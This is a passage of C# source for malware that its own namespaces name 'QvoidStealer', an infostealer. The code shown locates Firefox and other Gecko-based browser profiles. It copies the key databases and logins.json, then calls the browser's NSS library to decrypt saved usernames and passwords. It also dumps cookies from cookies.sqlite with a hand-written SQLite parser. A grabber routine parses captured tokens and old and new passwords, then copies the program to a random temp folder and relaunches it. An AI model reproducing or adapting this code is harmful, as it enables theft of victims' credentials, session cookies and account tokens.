            [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
            internal static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool FreeLibrary(IntPtr hModule);

            [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
            internal static extern IntPtr GetProcAddress(IntPtr hModule, string sProcName);
        }

        internal sealed class Nss3
        {
            public struct TSECItem
            {
                public int SECItemType;
                public IntPtr SECItemData;
                public int SECItemLen;
            }

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate long NssInit(string sDirectory);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate long NssShutdown();

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int Pk11SdrDecrypt(ref TSECItem tsData, ref TSECItem tsResult, int iContent);
        }

        public static class Decryptor
        {
            private static IntPtr hNss3;
            private static IntPtr hMozGlue;

            private static Nss3.NssInit fpNssInit;
            private static Nss3.Pk11SdrDecrypt fpPk11SdrDecrypt;
            private static Nss3.NssShutdown fpNssShutdown;

            public static bool LoadNSS(string sPath)
            {
                try
                {
                    hMozGlue = WinApi.LoadLibrary(sPath + "\\mozglue.dll");
                    hNss3 = WinApi.LoadLibrary(sPath + "\\nss3.dll");

                    IntPtr ipNssInitAddr = WinApi.GetProcAddress(hNss3, "NSS_Init");
                    IntPtr ipNssPk11SdrDecrypt = WinApi.GetProcAddress(hNss3, "PK11SDR_Decrypt");
                    IntPtr ipNssShutdown = WinApi.GetProcAddress(hNss3, "NSS_Shutdown");

                    fpNssInit = (Nss3.NssInit)Marshal.GetDelegateForFunctionPointer(ipNssInitAddr, typeof(Nss3.NssInit));
                    fpPk11SdrDecrypt = (Nss3.Pk11SdrDecrypt)Marshal.GetDelegateForFunctionPointer(ipNssPk11SdrDecrypt, typeof(Nss3.Pk11SdrDecrypt));
                    fpNssShutdown = (Nss3.NssShutdown)Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(Nss3.NssShutdown));

                    return true;
                }
                catch (Exception ex) { Console.WriteLine("Failed to load NSS\n" + ex); return false; }

            }

            public static void UnLoadNSS()
            {
                fpNssShutdown();
                WinApi.FreeLibrary(hNss3);
                WinApi.FreeLibrary(hMozGlue);
            }

            public static bool SetProfile(string sProfile)
            {
                return (fpNssInit(sProfile) == 0);
            }

            public static string DecryptPassword(string sEncPass)
            {
                IntPtr lpMemory = IntPtr.Zero;

                try
                {
                    byte[] bPassDecoded = Convert.FromBase64String(sEncPass);

                    lpMemory = Marshal.AllocHGlobal(bPassDecoded.Length);
                    Marshal.Copy(bPassDecoded, 0, lpMemory, bPassDecoded.Length);

                    Nss3.TSECItem tsiOut = new Nss3.TSECItem();
                    Nss3.TSECItem tsiItem = new Nss3.TSECItem();

                    tsiItem.SECItemType = 0;
                    tsiItem.SECItemData = lpMemory;
                    tsiItem.SECItemLen = bPassDecoded.Length;

                    if (fpPk11SdrDecrypt(ref tsiItem, ref tsiOut, 0) == 0)
                    {
                        if (tsiOut.SECItemLen != 0)
                        {
                            byte[] bDecrypted = new byte[tsiOut.SECItemLen];
                            Marshal.Copy(tsiOut.SECItemData, bDecrypted, 0, tsiOut.SECItemLen);

                            return Encoding.UTF8.GetString(bDecrypted);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    return null;
                }
                finally
                {
                    if (lpMemory != IntPtr.Zero)
                        Marshal.FreeHGlobal(lpMemory);
                }

                return null;
            }

            public static string GetUTF8(string sNonUtf8)
            {
                try
                {
                    byte[] bData = Encoding.Default.GetBytes(sNonUtf8);
                    return Encoding.UTF8.GetString(bData);
                }
                catch { return sNonUtf8; }
            }
        }

        public class Profile
        {
            public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            private static string[] GeckoBrowsersList = new string[]
            {
                "Mozilla\\Firefox",
                "Waterfox",
                "K-Meleon",
                "Thunderbird",
                "Comodo\\IceDragon",
                "8pecxstudios\\Cyberfox",
                "NETGATE Technologies\\BlackHaw",
                "Moonchild Productions\\Pale Moon"
            };

            private static string[] Concat(string[] x, string[] y)
            {
                if (x == null) throw new ArgumentNullException("x");
                if (y == null) throw new ArgumentNullException("y");
                int oldLen = x.Length;
                Array.Resize(ref x, x.Length + y.Length);
                Array.Copy(y, 0, x, oldLen, y.Length);
                return x;
            }

            // Get program files path
            private static string[] ProgramFilesChildren()
            {
                string programFiles = Environment.ExpandEnvironmentVariables("%ProgramW6432%");
                string programFilesX86 = Environment.ExpandEnvironmentVariables("%ProgramFiles(x86)%");

                List&lt;string&gt; directories = new List&lt;string&gt;();
                try { directories.AddRange(Directory.GetDirectories(programFiles)); } catch { }
                try { directories.AddRange(Directory.GetDirectories(programFilesX86)); } catch { }

                return directories.ToArray();
            }

            // Get profile directory location
            public static string GetProfile(string path)
            {
                try
                {
                    string dir = Path.Combine(path, "Profiles");
                    if (Directory.Exists(dir))
                        foreach (string sDir in Directory.GetDirectories(dir))
                            if (File.Exists(sDir + "\\logins.json") ||
                                File.Exists(sDir + "\\key4.db") ||
                                File.Exists(sDir + "\\places.sqlite"))
                                return sDir;
                }
                catch (Exception ex) { Console.WriteLine("Failed to find profile\n" + ex); }
                return null;
            }

            // Get directory with nss3.dll
            public static string GetMozillaPath()
            {
                foreach (string sDir in ProgramFilesChildren())
                {
                    if (File.Exists(sDir + "\\nss3.dll") &amp;&amp;
                        File.Exists(sDir + "\\mozglue.dll"))
                        return sDir;
                }
                return null;
            }

            // Get gecko based browsers path
            public static string[] GetMozillaBrowsers()
            {
                List&lt;string&gt; foundBrowsers = new List&lt;string&gt;();
                foreach (string browser in GeckoBrowsersList)
                {
                    string bdir = Path.Combine(Appdata, browser);
                    if (Directory.Exists(bdir))
                    {
                        foundBrowsers.Add(bdir);
                    }
                }
                return foundBrowsers.ToArray();
            }
        }

        internal class SQLite
        {
            private readonly byte[] _sqlDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
            private readonly ulong _dbEncoding;
            private readonly byte[] _fileBytes;
            private readonly ulong _pageSize;
            private string[] _fieldNames;
            private SqliteMasterEntry[] _masterTableEntries;
            private TableEntry[] _tableEntries;

            public SQLite(string fileName)
            {
                _fileBytes = File.ReadAllBytes(fileName);
                _pageSize = ConvertToULong(16, 2);
                _dbEncoding = ConvertToULong(56, 4);
                ReadMasterTable(100L);
            }

            public string GetValue(int rowNum, int field)
            {
                try
                {
                    if (rowNum &gt;= _tableEntries.Length)
                        return (string)null;
                    return field &gt;= _tableEntries[rowNum].Content.Length ? null : _tableEntries[rowNum].Content[field];
                }
                catch
                {
                    return "";
                }
            }

            public int GetRowCount()
            {
                return _tableEntries.Length;
            }

            private bool ReadTableFromOffset(ulong offset)
            {
                try
                {
                    if (_fileBytes[offset] == 13)
                    {
                        uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
                        int num2 = 0;
                        if (_tableEntries != null)
                        {
                            num2 = _tableEntries.Length;
                            Array.Resize(ref _tableEntries, _tableEntries.Length + (int)num1 + 1);
                        }
                        else
                            _tableEntries = new TableEntry[(int)num1 + 1];
                        for (uint index1 = 0; (int)index1 &lt;= (int)num1; ++index1)
                        {
                            ulong num3 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
                            if ((long)offset != 100L)
                                num3 += offset;
                            int endIdx1 = Gvl((int)num3);
                            Cvl((int)num3, endIdx1);
                            int endIdx2 = Gvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L));
                            Cvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L), endIdx2);
                            ulong num4 = num3 + (ulong)(endIdx2 - (long)num3 + 1L);
                            int endIdx3 = Gvl((int)num4);
                            int endIdx4 = endIdx3;
                            long num5 = Cvl((int)num4, endIdx3);
                            RecordHeaderField[] array = null;
                            long num6 = (long)num4 - endIdx3 + 1L;
                            int index2 = 0;
                            while (num6 &lt; num5)
                            {
                                Array.Resize(ref array, index2 + 1);
                                int startIdx = endIdx4 + 1;
                                endIdx4 = Gvl(startIdx);
                                array[index2].Type = Cvl(startIdx, endIdx4);
                                array[index2].Size = array[index2].Type &lt;= 9L ? _sqlDataTypeSize[array[index2].Type] : (!IsOdd(array[index2].Type) ? (array[index2].Type - 12L) / 2L : (array[index2].Type - 13L) / 2L);
                                num6 = num6 + (endIdx4 - startIdx) + 1L;
                                ++index2;
                            }
                            if (array != null)
                            {
                                _tableEntries[num2 + (int)index1].Content = new string[array.Length];
                                int num7 = 0;
                                for (int index3 = 0; index3 &lt;= array.Length - 1; ++index3)
                                {
                                    if (array[index3].Type &gt; 9L)
                                    {
                                        if (!IsOdd(array[index3].Type))
                                        {
                                            if ((long)_dbEncoding == 1L)
                                                _tableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                            else if ((long)_dbEncoding == 2L)
                                            {
                                                _tableEntries[num2 + (int)index1].Content[index3] = Encoding.Unicode.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                            }
                                            else if ((long)_dbEncoding == 3L)
                                                _tableEntries[num2 + (int)index1].Content[index3] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                        }
                                        else
                                            _tableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                    }
                                    else
                                        _tableEntries[num2 + (int)index1].Content[index3] = Convert.ToString(ConvertToULong((int)((long)num4 + num5 + num7), (int)array[index3].Size));
                                    num7 += (int)array[index3].Size;
                                }
                            }
                        }
                    }
                    else if (_fileBytes[offset] == 5)
                    {
                        uint num1 = (uint)(ConvertToULong((int)((long)offset + 3L), 2) - 1UL);
                        for (uint index = 0; (int)index &lt;= (int)num1; ++index)
                        {
                            uint num2 = (uint)ConvertToULong((int)offset + 12 + (int)index * 2, 2);
                            ReadTableFromOffset((ConvertToULong((int)((long)offset + num2), 4) - 1UL) * _pageSize);
                        }
                        ReadTableFromOffset((ConvertToULong((int)((long)offset + 8L), 4) - 1UL) * _pageSize);
                    }
                    return true;
                }
                catch
                {
                    return false;
                }
            }

            private void ReadMasterTable(long offset)
            {
                try
                {
                    switch (_fileBytes[offset])
                    {
                        case 5:
                            uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
                            for (int index = 0; index &lt;= (int)num1; ++index)
                            {
                                uint num2 = (uint)ConvertToULong((int)offset + 12 + index * 2, 2);
                                if (offset == 100L)
                                    ReadMasterTable(((long)ConvertToULong((int)num2, 4) - 1L) * (long)_pageSize);
                                else
                                    ReadMasterTable(((long)ConvertToULong((int)(offset + num2), 4) - 1L) * (long)_pageSize);
                            }
                            ReadMasterTable(((long)ConvertToULong((int)offset + 8, 4) - 1L) * (long)_pageSize);
                            break;
                        case 13:
                            ulong num3 = ConvertToULong((int)offset + 3, 2) - 1UL;
                            int num4 = 0;
                            if (_masterTableEntries != null)
                            {
                                num4 = _masterTableEntries.Length;
                                Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num3 + 1);
                            }
                            else
                                _masterTableEntries = new SqliteMasterEntry[checked((ulong)unchecked((long)num3 + 1L))];
                            for (ulong index1 = 0; index1 &lt;= num3; ++index1)
                            {
                                ulong num2 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
                                if (offset != 100L)
                                    num2 += (ulong)offset;
                                int endIdx1 = Gvl((int)num2);
                                Cvl((int)num2, endIdx1);
                                int endIdx2 = Gvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L));
                                Cvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L), endIdx2);
                                ulong num5 = num2 + (ulong)(endIdx2 - (long)num2 + 1L);
                                int endIdx3 = Gvl((int)num5);
                                int endIdx4 = endIdx3;
                                long num6 = Cvl((int)num5, endIdx3);
                                long[] numArray = new long[5];
                                for (int index2 = 0; index2 &lt;= 4; ++index2)
                                {
                                    int startIdx = endIdx4 + 1;
                                    endIdx4 = Gvl(startIdx);
                                    numArray[index2] = Cvl(startIdx, endIdx4);
                                    numArray[index2] = numArray[index2] &lt;= 9L ? _sqlDataTypeSize[numArray[index2]] : (!IsOdd(numArray[index2]) ? (numArray[index2] - 12L) / 2L : (numArray[index2] - 13L) / 2L);
                                }
                                if ((long)_dbEncoding == 1L || (long)_dbEncoding == 2L)

                                    if ((long)_dbEncoding == 1L)
                                        _masterTableEntries[num4 + (int)index1].ItemName = Encoding.Default.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                                    else if ((long)_dbEncoding == 2L)
                                        _masterTableEntries[num4 + (int)index1].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                                    else if ((long)_dbEncoding == 3L)
                                        _masterTableEntries[num4 + (int)index1].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                                _masterTableEntries[num4 + (int)index1].RootNum = (long)ConvertToULong((int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2]), (int)numArray[3]);
                                if ((long)_dbEncoding == 1L)
                                    _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                                else if ((long)_dbEncoding == 2L)
                                    _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                                else if ((long)_dbEncoding == 3L)
                                    _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                            }
                            break;
                    }
                }
                catch
                {
                }
            }

            public bool ReadTable(string tableName)
            {
                try
                {
                    int index1 = -1;
                    for (int index2 = 0; index2 &lt;= _masterTableEntries.Length; ++index2)
                    {
                        if (string.Compare(_masterTableEntries[index2].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
                        {
                            index1 = index2;
                            break;
                        }
                    }
                    if (index1 == -1)
                        return false;
                    string[] strArray = _masterTableEntries[index1].SqlStatement.Substring(_masterTableEntries[index1].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(',');
                    for (int index2 = 0; index2 &lt;= strArray.Length - 1; ++index2)
                    {
                        strArray[index2] = strArray[index2].TrimStart();
                        int length = strArray[index2].IndexOf(' ');
                        if (length &gt; 0)
                            strArray[index2] = strArray[index2].Substring(0, length);
                        if (strArray[index2].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
                        {
                            Array.Resize(ref _fieldNames, index2 + 1);
                            _fieldNames[index2] = strArray[index2];
                        }
                    }
                    return ReadTableFromOffset((ulong)(_masterTableEntries[index1].RootNum - 1L) * _pageSize);
                }
                catch
                {
                    return false;
                }
            }

            private ulong ConvertToULong(int startIndex, int size)
            {
                try
                {
                    if (size &gt; 8 | size == 0)
                        return 0;
                    ulong num = 0;
                    for (int index = 0; index &lt;= size - 1; ++index)
                        num = num &lt;&lt; 8 | (ulong)_fileBytes[startIndex + index];
                    return num;
                }
                catch
                {
                    return 0;
                }
            }

            private int Gvl(int startIdx)
            {
                try
                {
                    if (startIdx &gt; _fileBytes.Length)
                        return 0;
                    for (int index = startIdx; index &lt;= startIdx + 8; ++index)
                    {
                        if (index &gt; _fileBytes.Length - 1)
                            return 0;
                        if (((int)_fileBytes[index] &amp; 128) != 128)
                            return index;
                    }
                    return startIdx + 8;
                }
                catch
                {
                    return 0;
                }
            }

            private long Cvl(int startIdx, int endIdx)
            {
                try
                {
                    ++endIdx;
                    byte[] numArray = new byte[8];
                    int num1 = endIdx - startIdx;
                    bool flag = false;
                    if (num1 == 0 | num1 &gt; 9)
                        return 0;
                    if (num1 == 1)
                    {
                        numArray[0] = (byte)(_fileBytes[startIdx] &amp; (uint)sbyte.MaxValue);
                        return BitConverter.ToInt64(numArray, 0);
                    }
                    if (num1 == 9)
                        flag = true;
                    int num2 = 1;
                    int num3 = 7;
                    int index1 = 0;
                    if (flag)
                    {
                        numArray[0] = _fileBytes[endIdx - 1];
                        --endIdx;
                        index1 = 1;
                    }
                    int index2 = endIdx - 1;
                    while (index2 &gt;= startIdx)
                    {
                        if (index2 - 1 &gt;= startIdx)
                        {
                            numArray[index1] = (byte)(_fileBytes[index2] &gt;&gt; num2 - 1 &amp; byte.MaxValue &gt;&gt; num2 | _fileBytes[index2 - 1] &lt;&lt; num3);
                            ++num2;
                            ++index1;
                            --num3;
                        }
                        else if (!flag)
                            numArray[index1] = (byte)(_fileBytes[index2] &gt;&gt; num2 - 1 &amp; byte.MaxValue &gt;&gt; num2);
                        index2 += -1;
                    }
                    return BitConverter.ToInt64(numArray, 0);
                }
                catch
                {
                    return 0;
                }
            }

            private static bool IsOdd(long value)
            {
                return (value &amp; 1L) == 1L;
            }

            private struct RecordHeaderField
            {
                public long Size;
                public long Type;
            }

            private struct TableEntry
            {
                public string[] Content;
            }

            private struct SqliteMasterEntry
            {
                public string ItemName;
                public long RootNum;
                public string SqlStatement;
            }

            public static SQLite ReadTable(string database, string table)
            {
                if (!File.Exists(database))
                    return null;
                string NewPath = Path.GetTempFileName() + ".tmpdb";
                File.Copy(database, NewPath);
                SQLite SQLiteConnection = new SQLite(NewPath);
                SQLiteConnection.ReadTable(table);
                File.Delete(NewPath);
                if (SQLiteConnection.GetRowCount() == 65536)
                    return null;
                return SQLiteConnection;
            }
        }

        internal sealed class Cookies
        {
            public static string GetAll()
            {
                string result = string.Empty;
                foreach (string browser in Profile.GetMozillaBrowsers())
                {
                    foreach (var account in Cookies.Get(browser))
                    {
                        var _browser = browser.Split('\\');
                        result += account.ToString(_browser[_browser.Length - 1]);
                    }
                }

                return result;
            }

            public static List&lt;CookieModel&gt; Get(string BrowserDir)
            {
                List&lt;CookieModel&gt; lcCookies = new List&lt;CookieModel&gt;();
                // Get firefox default profile directory
                string profile = Profile.GetProfile(BrowserDir);
                // Read cookies from file
                if (profile == null) return lcCookies;
                string db_location = Path.Combine(profile, "cookies.sqlite");
                // Read data from table
                SQLite sSQLite = SQLite.ReadTable(db_location, "moz_cookies");
                if (sSQLite == null) return lcCookies;
                // Get values from table
                for (int i = 0; i &lt; sSQLite.GetRowCount(); i++)
                {
                    CookieModel cCookie = new CookieModel();
                    cCookie.Name = sSQLite.GetValue(i, 2);
                    cCookie.Value = sSQLite.GetValue(i, 3);
                    cCookie.HostName = sSQLite.GetValue(i, 5);

                    lcCookies.Add(cCookie);
                }

                return lcCookies;
            }
        }

        internal sealed class Passwords
        {
            private static string SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
            private static string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");
            private static string[] RequiredFiles = new string[] { "key3.db", "key4.db", "logins.json", "cert9.db" };

            // Copy key3.db, key4.db, logins.json if exists
            private static string CopyRequiredFiles(string profile)
            {
                string profileName = new DirectoryInfo(profile).Name;
                string newProfileName = Path.Combine(CopyTempPath, profileName);

                if (!Directory.Exists(newProfileName))
                    Directory.CreateDirectory(newProfileName);
                //Directory.Delete(newProfileName);


                foreach (string file in RequiredFiles)
                    try
                    {
                        string requiredFile = Path.Combine(profile, file);
                        if (File.Exists(requiredFile))
                            File.Copy(requiredFile, Path.Combine(newProfileName, Path.GetFileName(requiredFile)));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Failed to copy files to decrypt passwords\n" + ex);
                        return null;
                    }

                return Path.Combine(CopyTempPath, profileName);
            }

            public static string GetAll()
            {
                string result = string.Empty;
                foreach (string browser in Profile.GetMozillaBrowsers())
                {
                    if (!Directory.Exists(browser))
                        continue;

                    foreach (var account in Passwords.Get(browser))
                    {
                        var _browser = browser.Split('\\');
                        result += account.ToString(_browser[_browser.Length - 1]);
                    }
                }

                return result;
            }

            // Get passwords from gecko browser
            public static List&lt;CredentialModel&gt; Get(string BrowserDir)
            {
                List&lt;CredentialModel&gt; pPasswords = new List&lt;CredentialModel&gt;();

                // Get firefox default profile directory
                string profile = Profile.GetProfile(BrowserDir);
                if (profile == null) return pPasswords;
                // Get firefox nss3.dll location
                string Nss3Dir = Profile.GetMozillaPath();
                if (Nss3Dir == null) return pPasswords;
                // Copy required files to temp dir
                string newProfile = CopyRequiredFiles(profile);
                if (newProfile == null) return pPasswords;
                // Read accounts from file
                string db_location = Path.Combine(newProfile, "logins.json");
                if (!File.Exists(db_location))
                    return null;
                string JSON_STRING = File.ReadAllText(db_location);
                // Parse Json string
                var json = new Json(JSON_STRING);
                json.Remove(new string[] { ",\"logins\":\\[", ",\"potentiallyVulnerablePasswords\"" });
                string[] accounts = json.SplitData();
                // Enumerate accounts
                if (Decryptor.LoadNSS(Nss3Dir))
                {
                    if (!Decryptor.SetProfile(newProfile))
                        Console.WriteLine("Failed to set profile!");

                    foreach (string account in accounts)
                    {
                        CredentialModel pPassword = new CredentialModel();
                        var json_account = new Json(account);

                        string
                            hostname = json_account.GetValue("hostname"),
                            username = json_account.GetValue("encryptedUsername"),
                            password = json_account.GetValue("encryptedPassword");

                        if (!string.IsNullOrEmpty(password))
                        {
                            pPassword.Url = hostname;
                            pPassword.Username = Decryptor.DecryptPassword(username);
                            pPassword.Password = Decryptor.DecryptPassword(password);

                            pPasswords.Add(pPassword);
                        }
                    }

                    Decryptor.UnLoadNSS();
                }
                Directory.Delete(newProfile, recursive: true);
                return pPasswords;
            }
        }
    }
}

namespace QvoidStealer.Miscellaneous.Stealers.Browsers
{
    internal sealed class Json
    {
        public string Data;
        public Json(string data)
        {
            this.Data = data;
        }
        // Get string value from json dictonary
        public string GetValue(string value)
        {
            string result = String.Empty;
            Regex valueRegex = new Regex($"\"{value}\":\"([^\"]+)\"");
            Match valueMatch = valueRegex.Match(this.Data);
            if (!valueMatch.Success)
                return result;

            result = Regex.Split(valueMatch.Value, "\"")[3];
            return result;
        }
        // Remove string
        public void Remove(string[] values)
        {
            foreach (string value in values)
                this.Data = this.Data.Replace(value, "");
        }
        // Get array from json data
        public string[] SplitData(string delimiter = "},")
        {
            return Regex.Split(this.Data, delimiter);
        }
    }

    internal static class Utils
    {
        /// &lt;summary&gt;
        /// Convert Color object into hex integer
        /// &lt;/summary&gt;
        /// &lt;param name="color"&gt;Color to be converted&lt;/param&gt;
        /// &lt;returns&gt;Converted hex integer&lt;/returns&gt;
        public static int ColorToHex(Color color)
        {
            string HS =
                color.R.ToString("X2") +
                color.G.ToString("X2") +
                color.B.ToString("X2");

            return int.Parse(HS, System.Globalization.NumberStyles.HexNumber);
        }

        internal static JObject StructToJson(object @struct)
        {
            Type type = @struct.GetType();
            JObject json = new JObject();

            FieldInfo[] fields = type.GetFields();
            foreach (FieldInfo field in fields)
            {
                string name = FieldNameToJsonName(field.Name);
                object value = field.GetValue(@struct);
                if (value == null)
                    continue;

                if (value is bool)
                    json.Add(name, (bool)value);
                else if (value is int)
                    json.Add(name, (int)value);
                else if (value is Color)
                    json.Add(name, ColorToHex((Color)value));
                else if (value is string)
                    json.Add(name, value as string);
                else if (value is DateTime)
                    json.Add(name, ((DateTime)value).ToString("O"));
                else if (value is IList &amp;&amp; value.GetType().IsGenericType)
                {
                    JArray array = new JArray();
                    foreach (object obj in value as IList)
                        array.Add(StructToJson(obj));
                    json.Add(name, array);
                }
                else json.Add(name, StructToJson(value));
            }
            return json;
        }

        static string[] ignore = { "InLine" };
        internal static string FieldNameToJsonName(string name)
        {
            if (ignore.ToList().Contains(name))
                return name.ToLower();

            List&lt;char&gt; result = new List&lt;char&gt;();

            if (IsFullUpper(name))
                result.AddRange(name.ToLower().ToCharArray());
            else
                for (int i = 0; i &lt; name.Length; i++)
                {
                    if (i &gt; 0 &amp;&amp; char.IsUpper(name[i]))
                        result.AddRange(new[] { '_', char.ToLower(name[i]) });
                    else result.Add(char.ToLower(name[i]));
                }
            return string.Join("", result);
        }

        internal static bool IsFullUpper(string str)
        {
            bool upper = true;
            for (int i = 0; i &lt; str.Length; i++)
            {
                if (!char.IsUpper(str[i]))
                {
                    upper = false;
                    break;
                }
            }
            return upper;
        }

        public static string Decode(Stream source)
        {
            using (StreamReader reader = new StreamReader(source))
                return reader.ReadToEnd();
        }

        public static byte[] Encode(string source, string encoding = "utf-8")
            =&gt; Encoding.GetEncoding(encoding).GetBytes(source);

        public static string ToString(this List&lt;CredentialModel&gt; credentialModels, string BrowserName)
        {
            string result = string.Empty;

            if (credentialModels == null)
                return "";

            foreach (var model in credentialModels)
            {
                result += $"{Environment.NewLine}Browser  : {BrowserName}";
                result += $"{Environment.NewLine}URL      : {model.Url}";
                result += $"{Environment.NewLine}Username : {model.Username}";
                result += $"{Environment.NewLine}Password : {model.Password}";
                result += $"{Environment.NewLine}---------------------------------------------------------------------";
            }


            return result;
        }

        public static string ToString(this CredentialModel credentialModel, string BrowserName)
        {
            string result = string.Empty;

            if (credentialModel == null)
                return "";

            result += $"{Environment.NewLine}Browser  : {BrowserName}";
            result += $"{Environment.NewLine}URL      : {credentialModel.Url}";
            result += $"{Environment.NewLine}Username : {credentialModel.Username}";
            result += $"{Environment.NewLine}Password : {credentialModel.Password}";
            result += $"{Environment.NewLine}---------------------------------------------------------------------";

            return result;
        }

        public static string ToString(this List&lt;CookieModel&gt; cookieModels, string BrowserName)
        {
            string result = string.Empty;

            if (cookieModels == null)
                return "";

            foreach (var model in cookieModels)
            {
                result += $"{Environment.NewLine}Browser   : {BrowserName}";
                result += $"{Environment.NewLine}Host Name : {model.HostName}";
                result += $"{Environment.NewLine}Name      : {model.Name}";
                result += $"{Environment.NewLine}Value     : {model.Value}";
                result += $"{Environment.NewLine}---------------------------------------------------------------------";
            }

            return result;
        }

        public static string ToString(this CookieModel cookieModel, string BrowserName)
        {
            string result = string.Empty;

            if (cookieModel == null)
                return "";

            result += $"{Environment.NewLine}Browser   : {BrowserName}";
            result += $"{Environment.NewLine}Host Name : {cookieModel.HostName}";
            result += $"{Environment.NewLine}Name      : {cookieModel.Name}";
            result += $"{Environment.NewLine}Value     : {cookieModel.Value}";
            result += $"{Environment.NewLine}---------------------------------------------------------------------";

            return result;
        }
    }

    public class CredentialModel
    {
        public string Url { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
    }

    public class CookieModel
    {
        public string Name;
        public string Value;
        public string HostName;
    }
}

namespace QvoidStealer.Main
{
    internal static class Grabber
    {
        /// &lt;summary&gt;
        /// This is the main function which executes all the grabber instances.
        /// &lt;/summary&gt;
        static private int Grab(string[] args)
        {
            string _Token = ""; string _OldPassword = ""; string _NewPassword = ""; string _reason = "";

            //Checking if the given argument(s) containing the information we need.
            foreach (var arg in args)
            {
                if (!arg.Contains("|%&amp;|"))
                    continue;

                var quries = arg.Split(new string[] { "|%&amp;|" }, StringSplitOptions.None);
                foreach (var _q in quries)
                {
                    var splitted = _q.Split('=');
                    switch (splitted[0])
                    {
                        case "token":
                            _Token = splitted[1] == "\"\"" ? "" : splitted[1];
                            break;
                        case "oldpass":
                            _OldPassword = splitted[1] == "\"\"" ? "" : splitted[1];
                            break;
                        case "password":
                            _NewPassword = splitted[1] == "\"\"" ? "" : splitted[1];
                            break;
                        case "reason":
                            _reason = splitted[1] == "\"\"" ? "" : splitted[1];
                            break;
                    }
                }
            }
            _OldPassword = _OldPassword == "undefined" ? "" : _OldPassword;
            _NewPassword = _NewPassword == "undefined" ? "" : _NewPassword;

            //Some random path to contains our temp files.
            string path = Path.GetTempPath() + $"\\{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 9)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 11)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 12)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 13)}-{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 14)}\\";

            //Checking if the current path have all the dependencies.
            if (!Directory.Exists($"{Application.StartupPath}\\x64")
                || !Directory.Exists($"{Application.StartupPath}\\x86")
                || !File.Exists($"{Application.StartupPath}\\x64\\SQLite.Interop.dll")
                || !File.Exists($"{Application.StartupPath}\\x86\\SQLite.Interop.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.Linq.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.EF6.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.dll")
                || !File.Exists($"{Application.StartupPath}\\Newtonsoft.Json.dll")
                || !File.Exists($"{Application.StartupPath}\\EntityFramework.SqlServer.dll")
                || !File.Exists($"{Application.StartupPath}\\EntityFramework.dll")
                || !File.Exists($"{Application.StartupPath}\\BouncyCastle.Crypto.dll"))
            {
                //If it hasn't we'll just copy them from the resources of the program into some folder in temp and start it.
                if (Directory.Exists(path))
                    Directory.Delete(path, true);

                Extract(path, path);

                File.Copy(Assembly.GetEntryAssembly().Location, $"{path}\\{AppDomain.CurrentDomain.FriendlyName}");
                Thread.Sleep(100);

                //Starting the grabber
                Process process = new Process()
                {
                    StartInfo = new ProcessStartInfo($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
                    {
                        Arguments = string.Join(" ", args),
                        WorkingDirectory = Path.GetDirectoryName($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
                    }
                };
                process.Start();

                Environment.Exit(0);
            }

